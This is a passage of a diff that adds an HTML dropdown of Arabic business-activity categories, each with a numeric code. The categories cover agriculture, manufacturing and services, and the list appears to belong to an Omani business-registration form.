+                <div class="activity-option" data-value="980">تمديد وصيانة الأنابيب بكافة أنواعها</div>
+                <div class="activity-option" data-value="979">تمديد وصيانة شبكات الغاز للمباني</div>
+                <div class="activity-option" data-value="1349">تموين السفن</div>
+                <div class="activity-option" data-value="767">تنجيد الأثاث مثل: المراتب، المجالس العربية، المجالس الإفرنجية ... إلخ</div>
+                <div class="activity-option" data-value="1019">تنجيد مقاعد السيارات</div>
+                <div class="activity-option" data-value="878">تنجيد مقاعد الطائرات وملحقاتها</div>
+                <div class="activity-option" data-value="1820">تنظيف السجاد والبسط والستائر والمفروشات</div>
+                <div class="activity-option" data-value="970">تنظيف وتسوية الموقع</div>
+                <div class="activity-option" data-value="1017">تنظيف وتلميع السيارات</div>
+                <div class="activity-option" data-value="1777">تنظيم الحفلات</div>
+                <div class="activity-option" data-value="1668">تنظيم الرحلات السياحية</div>
+                <div class="activity-option" data-value="1785">تنظيم الفعاليات الرياضية</div>
+                <div class="activity-option" data-value="1690">تنظيم المؤتمرات والندوات</div>
+                <div class="activity-option" data-value="1689">تنظيم وإدارة المعارض</div>
+                <div class="activity-option" data-value="1691">تنظيم وإدارة المهرجانات</div>
+                <div class="activity-option" data-value="923">تنقية المياه وتوزيع المياه</div>
+                <div class="activity-option" data-value="179">تهيئة المنسوجات والخيوط بواسطة الدباغة والكي والصباغة والطباعة ... إلخ</div>
+                <div class="activity-option" data-value="1098">توزيع أسطوانات غاز النفط المسال</div>
+                <div class="activity-option" data-value="918">توزيع أنواع الوقود الغازية عن طريق شبكة أنابيب رئيسية (المواسير)</div>
+                <div class="activity-option" data-value="1385">توصيل وجبات الطعام</div>
+                <div class="activity-option" data-value="915">توليد الطاقة الكهربائية</div>
+                <div class="activity-option" data-value="65">جرش الملح وتنقيته وتكريره</div>
+                <div class="activity-option" data-value="937">جمع البطاريات والزيوت المستعملة</div>
+                <div class="activity-option" data-value="40">جمع الفطر والكمأ</div>
+                <div class="activity-option" data-value="39">جمع اللبان</div>
+                <div class="activity-option" data-value="1709">جهات حكومية</div>
+                <div class="activity-option" data-value="1685">حاضنات ومسرعات الأعمال</div>
+                <div class="activity-option" data-value="959">حفر آبار الماء</div>
+                <div class="activity-option" data-value="68">حفر آبار النفط والغاز الطبيعي</div>
+                <div class="activity-option" data-value="87">حفظ الأسماك والمنتجات السمكية والأحياء المائية الأخرى بواسطة التجفيف أو التدخين أو التمليح</div>
+                <div class="activity-option" data-value="88">حفظ الأسماك والمنتجات السمكية والأحياء المائية الأخرى عن طريق التبريد أو التجميد</div>
+                <div class="activity-option" data-value="86">حفظ الأسماك والمنتجات السمكية والأحياء المائية الأخرى عن طريق التعليب</div>
+                <div class="activity-option" data-value="100">حفظ وتحميص وتعبئة المكسرات بأنواعها</div>
+                <div class="activity-option" data-value="1719">خبراء تخطيط حوادث المرور</div>
+                <div class="activity-option" data-value="1532">خدمات إدارة الطاقة الكهربائية</div>
+                <div class="activity-option" data-value="34">خدمات إستصلاح الأراضي للأغراض الزراعية</div>
+                <div class="activity-option" data-value="74">خدمات الاستكشاف مثل أساليب التنقيب التقليدية من قبيل أخذ عينات من جوف الأرض وأعمال الأرصاد الجيولوجية في المواقع المحتملة</div>
+                <div class="activity-option" data-value="1430">خدمات الاشتراك في القنوات الفضائية</div>
+                <div class="activity-option" data-value="1674">خدمات الأمن والحراسة</div>
+                <div class="activity-option" data-value="1366">خدمات البريد السريع</div>
+                <div class="activity-option" data-value="922">خدمات التبريد المركزي للمباني والمناطق</div>
+                <div class="activity-option" data-value="1579">خدمات الترجمة و التدقيق اللغوي</div>
+                <div class="activity-option" data-value="1561">خدمات الترويج والتسويق عبر مواقع التواصل الإجتماعي</div>
+                <div class="activity-option" data-value="1732">خدمات التعليم العالي</div>
+                <div class="activity-option" data-value="1443">خدمات التقييم الأمني</div>
+                <div class="activity-option" data-value="1827">خدمات الجنائز</div>
+                <div class="activity-option" data-value="1442">خدمات الدعم في مجال تقنية المعلومات والبرمجة الحاسوبية</div>
+                <div class="activity-option" data-value="1702">خدمات الدعم في مجال مراكز النداء والمساعدة المكتبية</div>
+                <div class="activity-option" data-value="41">خدمات الدعم للحراجة</div>
+                <div class="activity-option" data-value="951">خدمات العزل الجيلوجي لثاني أكسيد الكربون</div>
+                <div class="activity-option" data-value="1831">خدمات العناية بالبشرة</div>
+                <div class="activity-option" data-value="1354">خدمات المسافرين في المطارات</div>
+                <div class="activity-option" data-value="1296">خدمات النقل البري للركاب بالمطار</div>
+                <div class="activity-option" data-value="1338">خدمات بحرية</div>
+                <div class="activity-option" data-value="1682">خدمات تنظيف الخزانات والحاويات</div>
+                <div class="activity-option" data-value="1020">خدمات تنظيف المركبات في المواقع المحددة</div>
+                <div class="activity-option" data-value="930">خدمات جمع القمامة</div>
+                <div class="activity-option" data-value="931">خدمات جمع المواد القابلة للتدوير</div>
+                <div class="activity-option" data-value="933">خدمات جمع النفايات الخطرة</div>
+                <div class="activity-option" data-value="1469">خدمات دعم صناديق تنمية المؤسسات الصغيرة والمتوسطة</div>
+                <div class="activity-option" data-value="1830">خدمات رعاية الحيوانات الاليفة</div>
+                <div class="activity-option" data-value="1706">خدمة استخراج التأشيرات الأجنبية</div>
+                <div class="activity-option" data-value="509">خراطة المعادن</div>
+                <div class="activity-option" data-value="158">خلط الشاي وتعبئته</div>
+                <div class="activity-option" data-value="368">خلط مواد كيماوية لمعالجة مياه الصرف</div>
+                <div class="activity-option" data-value="224">دباغة الجلود (بالمواد الكيميائية أو النباتية أو المعدنية) وتهيئتها</div>
+                <div class="activity-option" data-value="1771">دور الحضانة</div>
+                <div class="activity-option" data-value="1770">دور رعاية كبار السن</div>
+                <div class="activity-option" data-value="76">ذبح وتهيئة الدواجن والأرانب والطيور</div>
+                <div class="activity-option" data-value="1725">روضة الأركان التعليمية</div>
+                <div class="activity-option" data-value="38">زراعة الأحراج وأنشطة الحراجة الأخرى</div>
+                <div class="activity-option" data-value="4">زراعة الأعلاف كالبرسيم وغيره من أعلاف الحيوانات</div>
+                <div class="activity-option" data-value="6">زراعة الأعناب</div>
+                <div class="activity-option" data-value="1">زراعة الحبوب (قمح، ذرة، شعير … إلخ)، باستثناء الأرز</div>
+                <div class="activity-option" data-value="10">زراعة الحمضيات (الموالح)</div>
+                <div class="activity-option" data-value="9">زراعة المانجو</div>
+                <div class="activity-option" data-value="16">زراعة المحاصيل التي تستخرج منها التوابل</div>
+                <div class="activity-option" data-value="17">زراعة المحاصيل الدائمة الأخرى</div>
+                <div class="activity-option" data-value="8">زراعة الموز</div>
+                <div class="activity-option" data-value="18">زراعة النباتات الحية لأغراض الغرس والزينة والشتلات (المشاتل)</div>
+                <div class="activity-option" data-value="5">زراعة النباتات العطرية والزهور (الأزهار وبراعم الأزهار)، بذور الأزهار</div>
+                <div class="activity-option" data-value="7">زراعة النخيل وإنتاج التمور</div>
+                <div class="activity-option" data-value="13">زراعة بذور الفاكهة</div>
+                <div class="activity-option" data-value="490">سبك الحديد والصلب (منتجات تامة ونصف تامة الصنع)</div>
+                <div class="activity-option" data-value="492">سبك المعادن غير الحديدية مثل الألومنيوم والزنك والنحاس، إلخ. (منتجات تامة ونصف تامة الصنع)</div>
+                <div class="activity-option" data-value="927">سحب مياه البحر لأغراض التبريد</div>
+                <div class="activity-option" data-value="1036">سماسرة السلع والمزايدين</div>
+                <div class="activity-option" data-value="1489">سمسار إعادة تأمين</div>
+                <div class="activity-option" data-value="1507">سمسار تأمين</div>
+                <div class="activity-option" data-value="1359">شحن وتفريغ البضائع التي يزيد وزنها على 25كغم</div>
+                <div class="activity-option" data-value="1358">شحن وتفريغ السفن</div>
+                <div class="activity-option" data-value="1494">شراء الأسهم لصالح الشركة</div>
+                <div class="activity-option" data-value="1425">شركات الاتصالات السلكية</div>
+                <div class="activity-option" data-value="1426">شركات الاتصالات اللاسلكية</div>
+                <div class="activity-option" data-value="1388">شركات تجهيز الطعام (تموين وإعاشة)</div>
+                <div class="activity-option" data-value="1471">صانع السوق</div>
+                <div class="activity-option" data-value="1467">صناديق التنمية</div>
+                <div class="activity-option" data-value="585">صناعة الأجهزة البصرية العلمية أو الطبية من الزجاج أو اللدائن أو المعادن ... الخ</div>
+                <div class="activity-option" data-value="139">صناعة السكر الخام من قصب السكر والبنجر</div>
+                <div class="activity-option" data-value="788">صناعة الطائرات بدون طيار (الدرونز / المودل)</div>
+                <div class="activity-option" data-value="218">صناعة المصر والشماغ</div>
+                <div class="activity-option" data-value="391">صناعة بيئات إستنبات أحياء دقيقة للإستخدمات المختبرية</div>
+                <div class="activity-option" data-value="642">صناعة معدات نقل القوى الميكانيكية من أي مادة (أعمدة، أذرعه، كراسي، تروس ... الخ)، للتدوير والتعشيق ونقل الحركة</div>
+                <div class="activity-option" data-value="412">صناعة مواد البناء من اللدائن مثل النوافذ والأبواب والستائر ولوازم الإضاءة</div>
+                <div class="activity-option" data-value="715">صنع آلات التجفيف الصناعية الخاصة بالمنسوجات والملبوسات والجلود</div>
+                <div class="activity-option" data-value="694">صنع آلات الثقب والحفر والتنقيب سواء كانت معدة للاستخدام تحت الأرض أو غير معدة لذلك</div>
+                <div class="activity-option" data-value="653">صنع آلات الرفع والمناولة والتحميل الأخرى مثل المصاعد وروافع السوائل والناقلات والتلفريك</div>
+                <div class="activity-option" data-value="721">صنع آلات إنتاج الزجاج أو الأوعية أو الألياف أو الخيوط الزجاجية، آلات تجليد الكتب وتجميع الورق</div>
+                <div class="activity-option" data-value="649">صنع آلات بسيطة ومعقدة وآلات ثابتة ومتحركة وآلات محمولة بكاملها على هياكل ذات عجلات</div>
+                <div class="activity-option" data-value="720">صنع آلات تجميع المصابيح الكهربائية أو الإلكترونية وما يماثلها</div>
+                <div class="activity-option" data-value="707">صنع آلات تحضير الألياف النسيجية (غزل، ندف وحلج القطن، تنظيف الصوف ... إلخ)</div>
+                <div class="activity-option" data-value="661">صنع آلات تعبئة الظروف وآلات فرز البريد ... إلخ</div>
+                <div class="activity-option" data-value="659">صنع آلات حاسبة يدوية ومكتبية</div>
+                <div class="activity-option" data-value="705">صنع آلات صنع الدخان الملطف، وآلات تجهيز التبغ، وآلات ومعدات الشيشة وأجزائها</div>
+                <div class="activity-option" data-value="719">صنع آلات لصنع المنتجات الخشبية وما يماثلها من الآلات الصناعية، وآلات لإنتاج القرميد والآجر والخزفيات ... إلخ</div>
+                <div class="activity-option" data-value="658">صنع آلات نسخ واستنسل وآلات طبع عناوين واوفست، آلات التصوير (تصوير المستندات)</div>
+                <div class="activity-option" data-value="668">صنع آلات وأجهزة تنقية وترشيح السوائل أو الغازات، آلات ومعدات التقطير والتكرير، أجهزة الطرد المركزي، آلات لإسالة الغاز أو الهواء ... إلخ، وآلات قذف الرمال</div>
+                <div class="activity-option" data-value="691">صنع آلات ومعدات لمناولة المعادن الساخنة مثل: محولات وقوالب سبك، مغارف، وآلات صب ... إلخ والمستخدمة في مسابك الفلزات</div>
+                <div class="activity-option" data-value="651">صنع أبراج حفر وأبراج رفع الكيابل وهياكل أبراج متحركة</div>
+                <div class="activity-option" data-value="735">صنع أجزاء المركبات المقطورة ونصف المقطورة</div>
+                <div class="activity-option" data-value="560">صنع أجهزة الاستقبال التلفزيوني وملحقاتها مثل: التلفزيوني والرسيفرات ... إلخ</div>
+                <div class="activity-option" data-value="565">صنع أجهزة الألعاب الإلكترونية (ألعاب الفيديو)</div>
+                <div class="activity-option" data-value="558">صنع أجهزة التصوير السينمائي وأجهزة التقاط الصور، أجهزة تصوير تحت الماء، أجهزة تصوير جوي ... إلخ</div>
+                <div class="activity-option" data-value="797">صنع أجهزة التقطير للمختبرات</div>
+                <div class="activity-option" data-value="578">صنع أجهزة تسجيل الوقت، أجهزة قياس وتسجيل الفترات الزمنية</div>
+                <div class="activity-option" data-value="557">صنع أجهزة تعمل بالأشعة تحت الحمراء (مثل أجهزة التحكم عن بعد)، وصنع أجهزة الاستدعاء (البيجر)</div>
+                <div class="activity-option" data-value="799">صنع أجهزة تقويم الأعضاء بما فيها العكازات الطبية</div>
+                <div class="activity-option" data-value="667">صنع أجهزة تكييف الهواء (وحدات أو مركزي) فريون أو مكيفات صحراوية</div>
+                <div class="activity-option" data-value="660">صنع أجهزة عد النقود، آلات ختم الطوابع وصرف التذاكر، آلات ختم، دباسات، خرامات ... إلخ</div>
+                <div class="activity-option" data-value="601">صنع أجهزة كهربائية لوصل أو قطع أو وقاية الدوائر الكهربائية (مفاتيح كهربائية، مصاهر، مانعات صواعق محددات فولت، علب توصيل ... إلخ)</div>
+                <div class="activity-option" data-value="576">صنع أجهزة محاكاة الطيران</div>
+                <div class="activity-option" data-value="611">صنع أجهزة مطابخ مثل الأفران والمايكرويف والشوايات، أجهزة محمصات الخبز، أجهزة عمل الشاي والقهوة ... إلخ</div>
+                <div class="activity-option" data-value="563">صنع أجهزة مكبرات الصوت وملحقاتها</div>
+                <div class="activity-option" data-value="571">صنع أجهزة وأدوات الضبط أو التحكم الآلي مثل: الترموستات، التحكم في الضغط ... إلخ</div>
+                <div class="activity-option" data-value="793">صنع أجهزة وأدوات ومعدات للطب والجراحة والطب البيطري وطب الأسنان والعيون، باستثناء المعدات الكهربائية الطبية والعلاجية</div>
+                <div class="activity-option" data-value="670">صنع أجهزة ومعدات الإطفاء والسلامة</div>
+                <div class="activity-option" data-value="580">صنع أجهزة ومعدات أنواع الأشعة</div>
+                <div class="activity-option" data-value="356">صنع أحبار الطباعة</div>
+                <div class="activity-option" data-value="376">صنع أحبار الكتابة والرسم</div>
+                <div class="activity-option" data-value="683">صنع أدوات آلية لتشكيل الفلزات أو المواد الأخرى مثل الخشب والأحجار والفلين والمطاط والزجاج ... إلخ (تشمل المواد الكاشطة)</div>
+                <div class="activity-option" data-value="684">صنع أدوات آلية للتدوير والثقب والحفر والتشكيل والسن ... إلخ</div>
+                <div class="activity-option" data-value="685">صنع أدوات آلية للتشكيل بالختم أو بالكبس مثل مكابس تخريم وهيدرولية، ومقصات وأدوات شق وفواصل، وعدد آلية ذات تصميم بسيط مثل المكابس والرفاسات التي تدار بالقدم، صنع أدوات آلية ذات تصميم متقدم مثل الآلات ذات التحكم الرقمي</div>
+                <div class="activity-option" data-value="515">صنع أدوات الحدادة والمناجل والقمط ومواقد اللحام ... إلخ</div>
+                <div class="activity-option" data-value="512">صنع أدوات القطع والقص</div>
+                <div class="activity-option" data-value="426">صنع أدوات المطبخ والمائدة والعبوات والأوعية الزجاجية</div>
+                <div class="activity-option" data-value="160">صنع أساس الشمع وأغذية النحل</div>
+                <div class="activity-option" data-value="449">صنع أصناف الزينة والتحف والتماثيل والمجسمات المصنوعة من الخزف والفخار</div>
+                <div class="activity-option" data-value="814">صنع أصناف للإستعمال الشخصي مثل: غلايين تدخين، نافثات عطور، ترامس عازلة، شعور مستعارة ... إلخ</div>
+                <div class="activity-option" data-value="525">صنع أصناف من الأسلاك مثل: سلك شائك، سياج، شبك ممدد ... إلخ</div>
+                <div class="activity-option" data-value="462">صنع أصناف من الأسمنت الاسبستوسي أو الأسمنت الليفي السيلوزي</div>
+                <div class="activity-option" data-value="464">صنع أصناف من الجبس مثل الأطر والبراويز المنقوشة والتماثيل والفازات وأصناف الزينة الأخرى</div>
+                <div class="activity-option" data-value="461">صنع أصناف من الخرسانة أو الأسمنت مثل الأنابيب والمواسير والأحواض والخزانات والاواني وأطر النوافذ والتماثيل وأصناف الزينة</div>
+                <div class="activity-option" data-value="473">صنع أصناف من خيوط وأنسجة لأغطية الرأس أو الأحذية أو الحبال ... إلخ</div>
+                <div class="activity-option" data-value="125">صنع أطعمة الإفطار (كورن فليكس، شيبس ... إلخ)، من الحبوب على شكل رقائق</div>
+                <div class="activity-option" data-value="163">صنع أعلاف الحيوانات الأليفة (الكلاب، القطط، السمك)</div>
+                <div class="activity-option" data-value="162">صنع أعلاف الدواجن والطيور</div>
+                <div class="activity-option" data-value="161">صنع أعلاف للحيوانات (الأعلاف المركزة، أعلاف الماشية)</div>
+                <div class="activity-option" data-value="153">صنع أغذية الأطفال الرضع وصغار الأطفال</div>
+                <div class="activity-option" data-value="419">صنع أغطية الأراضي المرنة، مثل الفينيل واللينوليوم</div>
+                <div class="activity-option" data-value="409">صنع أغطية الأرضيات من اللدائن على شكل لفات أو بلاطات</div>
+                <div class="activity-option" data-value="808">صنع أغطية الرأس المعدنية التي تستخدم من أجل السلامة</div>
+                <div class="activity-option" data-value="643">صنع أفران صهر وأفران كهربائية وغير كهربائية لأغراض الصهر والمعاملة الحرارية للخامات الفلزية وغير الفلزية والمواد الأخرى</div>
+                <div class="activity-option" data-value="644">صنع أفران ومعدات التسخين الصناعية والمختبرية الكهربائية</div>
+                <div class="activity-option" data-value="811">صنع أقلام من جميع الأنواع (سائل، جاف، رصاص)، رصاص أقلام</div>
+                <div class="activity-option" data-value="182">صنع أقمشة التريكو والكروشيه بجميع أنواعها</div>
+                <div class="activity-option" data-value="682">صنع الآلات الأخرى المستخدمة في الزراعة والفلاحة والغابات وتربية الحيوان والدواجن والنحل ... إلخ</div>
+                <div class="activity-option" data-value="678">صنع الآلات المستخدمة في الزراعة أو البستنة أو الغابات لتحضير التربة أو غرس أو تسميد المحاصيل، وصنع المحاريث والبذارات ... إلخ</div>
+                <div class="activity-option" data-value="700">صنع الآلات المستخدمة في صنع منتجات الألبان</div>
+                <div class="activity-option" data-value="775">صنع الآلات الموسيقية والوترية اليدوية أو الكهربائية</div>
+                <div class="activity-option" data-value="731">صنع الأبدان المصممة بما فيها المقصورات لتركيبها على هياكل ذات محركات</div>
+                <div class="activity-option" data-value="249">صنع الأبواب والنوافذ الخشبية (سواء كانت تحتوي أو لا تحتوي على تجهيزات معدنية مثل المفصلات والأقفال .. إلخ)</div>
+                <div class="activity-option" data-value="796">صنع الأثاث الطبي للمستشفيات والعيادات الطبية والبيطرية مثل الآسرة ومناضد العمليات ومقاعد طب الأسنان والحلاقين</div>
+                <div class="activity-option" data-value="764">صنع الأثاث من الألمنيوم والمعادن الأخرى للمنازل والفنادق والمطاعم والمكاتب ... إلخ</div>
+                <div class="activity-option" data-value="763">صنع الأثاث من الخشب للمنازل والفنادق والمكاتب والمحلات التجارية ... إلخ</div>
+                <div class="activity-option" data-value="765">صنع الأثاث من الخيزران، القصب، القش، الجلود، الزجاج، اللدائن ... إلخ، لكافة الأغراض</div>
+                <div class="activity-option" data-value="570">صنع الأجهزة المستخدمة في الملاحة والرصد الجوي، أجهزة قياس المساحة والأبعاد ... إلخ، أجهزة الرادار</div>
+                <div class="activity-option" data-value="800">صنع الأحذية والأحزمة الطبية وأجهزة السمع</div>
+                <div class="activity-option" data-value="325">صنع الأحماض غير العضوية (عدا حامض النيتريك) مثل حامض الكبريتيك والهيدروكلوريك ... إلخ</div>
+                <div class="activity-option" data-value="427">صنع الأدوات الزجاجية للمختبرات والاستعمالات المكتبية والصيدلانية والصحية ... إلخ وصنع زجاج الساعات والبصريات والعناصر البصرية غير المشغلة على أساس بصري</div>
+                <div class="activity-option" data-value="529">صنع الأدوات المعدنية للمكاتب (عدا الأثاث المعدني)</div>
+                <div class="activity-option" data-value="414">صنع الأدوات المنزلية وأدوات المطبخ والزينة</div>
+                <div class="activity-option" data-value="664">صنع الأدوات اليدوية التي تعمل بالطاقة</div>
+                <div class="activity-option" data-value="574">صنع الأدوات والأجهزة المستخدمة في القياس والضبط الآلي المستمر للمتغيرات مثل: أجهزة قياس حرارة المواد، الضغط أو اللزوجة للمواد ... إلخ</div>
+                <div class="activity-option" data-value="244">صنع الأرضيات الخشبية غير المجمعة مثل أرضيات الباركيه</div>
+                <div class="activity-option" data-value="406">صنع الأسفنج الصناعي</div>
+                <div class="activity-option" data-value="538">صنع الأسقف المعدنية ولوازمها</div>
+                <div class="activity-option" data-value="598">صنع الأسلاك والكابلات الكهربائية والإلكترونية الأخرى</div>
+                <div class="activity-option" data-value="504">صنع الأسلحة والذخائر والمعدات والرادارات العسكرية</div>
+                <div class="activity-option" data-value="336">صنع الأسمدة النيتروجينية (الأزوتية)</div>
+                <div class="activity-option" data-value="790">صنع الأسمنت المستخدم في طب الأسنان</div>
+                <div class="activity-option" data-value="452">صنع الأسمنت بكافة أنواعه</div>
+                <div class="activity-option" data-value="795">صنع الأسنان والأطراف الصناعية</div>
+                <div class="activity-option" data-value="619">صنع الإشارات الكهربائية، ومعدات الإشارة الكهربائية مثل إشارات المرور ومعدات إشارات المشاة</div>
+                <div class="activity-option" data-value="772">صنع الأشرطة والأساور المعدنية للساعات من معادن ثمينة</div>
+                <div class="activity-option" data-value="773">صنع الأشرطة والأساور المعدنية للساعات من معادن غير ثمينة</div>
+                <div class="activity-option" data-value="331">صنع الأصماغ الكيميائية</div>
+                <div class="activity-option" data-value="446">صنع الأصناف الخزفية بما في ذلك الأصناف المصنوعة من البورسلين أو الصيني أو الخزف الحجري أو الفخار المقلد أو العادي</div>
+                <div class="activity-option" data-value="425">صنع الأصناف الزجاجية المستخدمة في الإنشاءات، صنع زجاج المصابيح الكهربائية وكريستال النجف، صنع المشغولات الزجاجية الأخرى</div>
+                <div class="activity-option" data-value="405">صنع الأصناف الصحية أو الصيدلانية من المطاط</div>
+                <div class="activity-option" data-value="393">صنع الإطارات المطاطية الخارجية والداخلية للمركبات والمعدات والآلات المتنقلة ولعب الأطفال والأثاث (صنع الإطارات الهوائية والمصمتة أو الوسادية)</div>
+                <div class="activity-option" data-value="536">صنع الأغطية المعدنية لغرف تفتيش الصرف الصحي</div>
+                <div class="activity-option" data-value="564">صنع الأقراص المدمجة</div>
+                <div class="activity-option" data-value="516">صنع الأقفال والمفاتيح</div>
+                <div class="activity-option" data-value="417">صنع الأكياس بما فيها أكياس بولي ايثيلين وبلاستيك</div>
+                <div class="activity-option" data-value="432">صنع الألياف الزجاجية بما فيها الصوف الزجاجي ومنتجاته (بما فيها المستخدم لأغراض عزل الحرارة)</div>
+                <div class="activity-option" data-value="401">صنع الأنابيب والمواسير والخراطيم وسيور نقل الحركة ونقل المواد والسيور الأخرى، من المطاط</div>
+                <div class="activity-option" data-value="481">صنع الأنابيب والمواسير ولوازمها من الحديد والصلب</div>
+                <div class="activity-option" data-value="416">صنع الأنابيب ولوازمها من البلاستيك والمطاط</div>
+                <div class="activity-option" data-value="527">صنع الاواني المعدنية المجوفة وما يماثلها من أدوات المطبخ والمائدة وأدوات الشوي والقلي، وصنع الأدوات الصحية المعدنية المطلية بالنيكل من أحواض ومغاسل وما شابهها</div>
+                <div class="activity-option" data-value="526">صنع الأوعية المعدنية المستخدمة في نقل وتعبئة السلع مثل: البراميل والدلاء والصناديق والعلب ... إلخ</div>
+                <div class="activity-option" data-value="260">صنع الأوعية المنزلية وأدوات المطبخ وصناديق أدوات القطع المنزلية وأدوات تناول الطعام من الخشب</div>
+                <div class="activity-option" data-value="343">صنع البروبلين</div>
+                <div class="activity-option" data-value="191">صنع البسط والسجاد</div>
+                <div class="activity-option" data-value="133">صنع البسكويت بأنواعه</div>
+                <div class="activity-option" data-value="593">صنع البطاريات الجافة</div>
+                <div class="activity-option" data-value="592">صنع البطاريات السائلة والخلايا الأولية</div>
+                <div class="activity-option" data-value="185">صنع البطانيات وسجاد الصلاة والسفر</div>
+                <div class="activity-option" data-value="340">صنع البلاستيك (اللدائن) في أشكالها الأولية</div>
+                <div class="activity-option" data-value="458">صنع البلاط والموازيكو الإسمنتي بكافة أصنافه</div>
+                <div class="activity-option" data-value="344">صنع البولي إيثيلين</div>
+                <div class="activity-option" data-value="445">صنع التجهيزات الصحية الخزفية بما فيها تجهيزات الصرف الصحي والأصناف الخزفية غير الإنشائية</div>
+                <div class="activity-option" data-value="375">صنع الثقاب</div>
+                <div class="activity-option" data-value="607">صنع الثلاجات والمجمدات والمبردات والغسالات والمنشفات والمراوح الكهربائية</div>
+                <div class="activity-option" data-value="921">صنع الثلج للأغراض الغذائية وغيرها (للتبريد مثلا)</div>
+                <div class="activity-option" data-value="132">صنع الجاتوه والبيتيفور والكعك بأنواعه</div>
+                <div class="activity-option" data-value="454">صنع الجبس</div>
+                <div class="activity-option" data-value="455">صنع الجص</div>
+                <div class="activity-option" data-value="129">صنع الجلوكوز وشراب الجلوكوز وسكر الشعير (الملتوز)</div>
+                <div class="activity-option" data-value="223">صنع الجوارب بجميع أنواعها</div>
+                <div class="activity-option" data-value="453">صنع الجير الحي والجير المطفأ والجير المائي</div>
+                <div class="activity-option" data-value="195">صنع الحبال العادية المصنوعة من الألياف النسيجية</div>
+                <div class="activity-option" data-value="194">صنع الحبال الغليظة المستخدمة في السفن</div>
+                <div class="activity-option" data-value="478">صنع الحديد النقي بواسطة التحليل الكهربائي أو العمليات الكيميائية والحديد غير المصقول والحديد الإسفنجي والزهر بما في ذلك مسبوكات حديد الصلب والزهر</div>
+                <div class="activity-option" data-value="155">صنع الحساء بكافة أشكاله، وصنع التوابل ومرق التوابل والخل والخميرة</div>
+                <div class="activity-option" data-value="766">صنع الحشايا (المراتب) بمختلف أنواعها</div>
+                <div class="activity-option" data-value="281">صنع الحشو من المواد النسيجية مثل الحفاظات الصحية، سدادات قطنية لوقف النزيف</div>
+                <div class="activity-option" data-value="193">صنع الحصير من النسيج أو القطن أو الألياف الصناعية</div>
+                <div class="activity-option" data-value="189">صنع الحقائب والأكياس والأعلام والرايات والشماسي والتندات ... إلخ المصنوعة من القماش</div>
+                <div class="activity-option" data-value="145">صنع الحلاوة الطحينية</div>
+                <div class="activity-option" data-value="146">صنع الحلوى العمانية</div>
+                <div class="activity-option" data-value="143">صنع الحلويات السكرية</div>
+                <div class="activity-option" data-value="136">صنع الحلويات العربية تشمل المعمول وخلافه</div>
+                <div class="activity-option" data-value="251">صنع الحلي الخشبية المحدبة والقوالب والألواح الخشبية لكساء الأسقف والجدران الداخلية</div>
+                <div class="activity-option" data-value="768">صنع الحلي والمجوهرات من المعادن الثمينة أو من الأحجار الكريمة (تشمل صياغة الذهب والفضة)</div>
+                <div class="activity-option" data-value="117">صنع الحليب المجفف (البودرة) والمكثف</div>
+                <div class="activity-option" data-value="551">صنع الحواسيب والمعدات الملحقة</div>
+                <div class="activity-option" data-value="130">صنع الخبز ومنتجاته</div>
+                <div class="activity-option" data-value="246">صنع الخشب الأبلكاش والقشرة</div>
+                <div class="activity-option" data-value="520">صنع الخناجر العمانية</div>
+                <div class="activity-option" data-value="175">صنع الخيوط لأغراض الخياطة والحياكة</div>
+                <div class="activity-option" data-value="756">صنع الدراجات العادية غير المزودة بمحرك، دراجات الأطفال ذات العجلتين</div>
+                <div class="activity-option" data-value="755">صنع الدراجات الكهربائية و النارية</div>
+                <div class="activity-option" data-value="284">صنع الدفاتر والكراسات المدرسية، والأصناف المكتبية والمدرسية والتجارية الأخرى الورقية</div>
+                <div class="activity-option" data-value="124">صنع الدقيق والعجين للمخابز</div>
+                <div class="activity-option" data-value="350">صنع الدهانات</div>
+                <div class="activity-option" data-value="110">صنع الدهون الحيوانية الصالحة للأكل</div>
+                <div class="activity-option" data-value="726">صنع الدورانات والمراجيح ومنصات الرماية وغيرها من وسائل التسلية في الملاهي</div>
+                <div class="activity-option" data-value="739">صنع الرادياتيرات، الشكمانات، القوابض، مكابح ... إلخ</div>
+                <div class="activity-option" data-value="470">صنع الرخام ومنتجاته</div>
+                <div class="activity-option" data-value="550">صنع الروبوتات وأجهزة الذكاء الاصطناعي</div>
+                <div class="activity-option" data-value="424">صنع الزجاج على شكل كتل، ألواح، أنابيب، قضبان سواء كان مشغولا أو غير مشغول، أو بتركيبات كيميائية مثل الكوارتز، أو الزجاج الملون أو المسلح أو المسحوب... إلخ</div>
+                <div class="activity-option" data-value="371">صنع الزيوت الأساسية وتعديل الزيوت والدهون كيمائيا مثل: البلمرة والأكسدة</div>
+                <div class="activity-option" data-value="377">صنع الزيوت العطرية</div>
+                <div class="activity-option" data-value="657">صنع السبورات البيضاء ولوحات الإعلانات</div>
+                <div class="activity-option" data-value="663">صنع السبورات السوداء</div>
+                <div class="activity-option" data-value="746">صنع السفن التقليدية الخشبية</div>
+                <div class="activity-option" data-value="761">صنع السلال ذات العجلات وعربات اليد الصغيرة</div>
+                <div class="activity-option" data-value="250">صنع السلالم والدرابزينات والشرفات الخشبية والقطع المربعة والمستطيلة وشرائح أرضيات الباركيه المجمعة في ألواح</div>
+                <div class="activity-option" data-value="941">صنع السلع الوسيطة من مدخلات النفايات والخردة الفلزية (المعدنية)</div>
+                <div class="activity-option" data-value="944">صنع السلع الوسيطة من مدخلات النفايات والخردة اللافلزية (غير المعدنية)</div>
+                <div class="activity-option" data-value="519">صنع السيوف والجنبيات والأسلحة المماثلة</div>
+                <div class="activity-option" data-value="365">صنع الشمع الاصطناعي والشمع المحضر المكون من مخاليط الشموع</div>
+                <div class="activity-option" data-value="142">صنع الشوكولاتة والحلويات المصنوعة من الشوكولاتة</div>
+                <div class="activity-option" data-value="358">صنع الصابون بجميع أشكاله (سائل، معجون، جاف)، والورق أو اللباد المغطى بالصابون وصنع الشامبوهات</div>
+                <div class="activity-option" data-value="501">صنع الصهاريج والخزانات والصوامع</div>
+                <div class="activity-option" data-value="387">صنع الضمادات الجراحية والحشو الطبي وضمادات الكسور وخيوط الجراحة</div>
+                <div class="activity-option" data-value="457">صنع الطابوق الأسمنتي المفرغ والآجار</div>
+                <div class="activity-option" data-value="443">صنع الطوب الأحمر والطفلي العازل للحرارة</div>
+                <div class="activity-option" data-value="438">صنع الطوب الرملي وكتل الأرضيات وبلاطات الأسقف وبوتقات المداخن</div>
+                <div class="activity-option" data-value="434">صنع الطوب والكتل والبلاطات الحرارية بما فيها الأسمنت الحراري</div>
+                <div class="activity-option" data-value="216">صنع العباءات الرجالية (البشوت) والمشالح من الشعر أو الصوف أو الوبر</div>
